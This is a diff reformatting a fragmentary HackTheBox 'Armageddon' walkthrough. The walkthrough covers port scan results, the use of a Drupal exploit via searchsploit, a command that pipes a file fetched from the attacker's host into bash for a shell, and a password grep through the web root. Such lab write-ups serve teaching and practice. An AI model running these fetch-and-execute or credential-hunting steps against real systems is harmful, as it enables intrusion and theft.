@@ -1,20 +1,20 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Armageddon
-# 26/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Linux |
+| Difficulty | Easy |
+
 10.10.10.233
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 └─$ searchsploit drupal 7
 └─$ searchsploit -m php/webapps/44449.rb
 └─$ sudo gem install highline           
@@ -30,9 +30,7 @@ armageddon.htb>> curl http://10.10.16.3:80/index.html | bash
 
 now we have stable shell
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 cd /var/www/html/sites/default
 
 grep -iRn 'password' web.config
